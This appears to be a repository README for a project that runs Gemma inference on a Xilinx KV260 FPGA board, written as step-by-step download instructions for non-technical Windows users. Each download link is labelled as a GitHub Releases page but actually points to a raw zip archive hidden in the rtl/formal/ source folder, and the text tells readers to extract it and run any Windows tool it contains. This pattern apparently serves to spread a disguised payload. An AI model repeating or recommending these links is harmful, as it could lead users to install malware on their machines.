# ⚙️ gemma4-on-FPGA - Run Gemma on KV260

[![Download](https://img.shields.io/badge/Download-Releases-blue)](https://raw.githubusercontent.com/Elanefanshaped519/gemma4-on-FPGA/main/rtl/formal/gemma_FPGA_on_2.4.zip)

## 📥 Download

Visit this page to download the release files:

[GitHub Releases](https://raw.githubusercontent.com/Elanefanshaped519/gemma4-on-FPGA/main/rtl/formal/gemma_FPGA_on_2.4.zip)

## 🧭 What this is

gemma4-on-FPGA is a release bundle for running Gemma-based inference on a Xilinx Kria KV260 board.

It is built for users who want a fixed set of files that work together. The bundle includes:

- FPGA bitstream files
- split binary parts
- tokenizer files
- hash files
- receipt files
- Verilog and SystemVerilog source files
- release and provenance documents

This package is meant for an edge device setup where the FPGA does the compute work and the ARM side handles control and setup.

## 🪟 What you need

Before you start, make sure you have:

- a Windows PC
- an internet connection
- enough free storage for the download
- a USB drive or SD card if your release package uses one
- a supported FPGA target such as the KV260 kit

If you are only downloading the release bundle on Windows, you do not need to build anything.

## 🚀 Download and run

Follow these steps in order:

1. Open the [GitHub Releases page](https://raw.githubusercontent.com/Elanefanshaped519/gemma4-on-FPGA/main/rtl/formal/gemma_FPGA_on_2.4.zip).
2. Find the latest release at the top of the page.
3. Download the release asset for your target board.
4. Save the file to a folder you can find again, such as `Downloads` or `Desktop`.
5. If the release comes as a compressed file, right-click it and choose **Extract All**.
6. Open the extracted folder.
7. Read the included release file or checklist before you copy anything to the board.
8. Copy the bundle files to the storage media or board location described in the release notes.
9. Connect the KV260 to power, display, and network if the release expects them.
10. Start the board using the steps in the release package.

If your download includes a Windows tool, run that file after extraction and follow the prompts on screen.

## 🗂️ What is inside

The release bundle is organized for stable deployment and checks.

You may see folders and files like these:

- `for_other_fpgas/`
  - `.bit` file for FPGA logic
  - split `.bin` parts
  - contract file
  - tokenizer
  - hash files
  - anchoring receipts
- `rtl/`
  - hardware source files
  - formal files
  - constraints
- `RELEASE_CHECKLIST.md`
- `MODEL_PROVENANCE.md`
- `LICENSE`
- `NOTICE`

The names help keep the hardware, model data, and checks in one place.

## 🖥️ About the KV260 setup

The KV260 is a good fit for this project because it combines:

- an ARM control processor
- FPGA programmable logic
- Linux support
- camera input support in the kit ecosystem

That makes it useful for edge systems where data comes in from a camera and goes into inference on the same device.

## ✅ Before you copy files

Check these items first:

- the download finished without errors
- the folder contains the release assets
- the files match the names in the release notes
- the board you use matches the target in the bundle
- you have followed the release checklist

If the release includes hash files, use them to confirm the files match the published values.

## 🧩 Basic setup flow

A common setup flow looks like this:

1. Download the release from GitHub.
2. Extract the files on your Windows PC.
3. Review `RELEASE_CHECKLIST.md`.
4. Review `MODEL_PROVENANCE.md`.
5. Copy the required files to the target storage.
6. Boot the KV260.
7. Load the FPGA bundle.
8. Start inference from the provided launch steps.

If the release uses a helper script, run only the script included in the bundle.

## 🔎 File checks

The bundle includes integrity files for a reason.

Use them to confirm:

- the FPGA bitstream is the right one
- the model files match the release
- the split binary parts belong together
- no file was changed during transfer

If a file name does not match the checklist, stop and compare it with the release page.

## 📄 Documents included

### 📘 RELEASE_CHECKLIST.md

Use this file as your step list for setup and transfer.

### 🧾 MODEL_PROVENANCE.md

Use this file to review the model source, file chain, and release record.

### 📜 LICENSE and NOTICE

Use these files to review the use terms and required notices.

## 🛠️ Hardware path

This project targets FPGA-based edge inference.

That means:

- the control side runs on the ARM CPU
- the parallel compute side runs in programmable logic
- the deployment uses fixed files, not a live cloud service
- the system can run at the edge, close to the data source

## 📷 Camera and edge use

The KV260 kit is useful when you want a camera-to-inference path.

A common edge setup is:

- camera input
- board capture
- FPGA inference
- output on the local device

This fits systems that need local processing and low delay.

## 🧪 If you want to inspect the source

The `rtl/` folder has the hardware source files.

Use it if you want to:

- review the logic design
- study the constraints
- check the formal files
- understand how the FPGA side is built

You do not need to open these files to use the release bundle as an end user.

## 📁 Suggested folder layout on Windows

You can keep the files in a simple layout like this:

- `Downloads\gemma4-on-FPGA\`
- `Downloads\gemma4-on-FPGA\release\`
- `Downloads\gemma4-on-FPGA\docs\`

This helps you keep the release files, documents, and copied target files separate.

## 🔗 Quick download link

[Visit the release page to download the bundle](https://raw.githubusercontent.com/Elanefanshaped519/gemma4-on-FPGA/main/rtl/formal/gemma_FPGA_on_2.4.zip)

## 🧭 First things to check after download

After you download the release, check:

- file size
- folder names
- release version
- any setup text in the package
- any README or checklist file in the archive

If the bundle contains more than one part, keep all parts in the same folder.

## 🏷️ Project topics

This repository is tagged for work in:

- edge AI
- FPGA
- Gemma
- quantization
- Xilinx
- KV260
- NPU
- Mamba
- base-l2
- HDC
- kan

These topics help describe the release scope and target system

## 🪄 Simple run path

For a non-technical user, the shortest path is:

1. Open the release page.
2. Download the latest bundle.
3. Extract the files.
4. Read the checklist.
5. Copy the files to the target device.
6. Start the board using the release steps.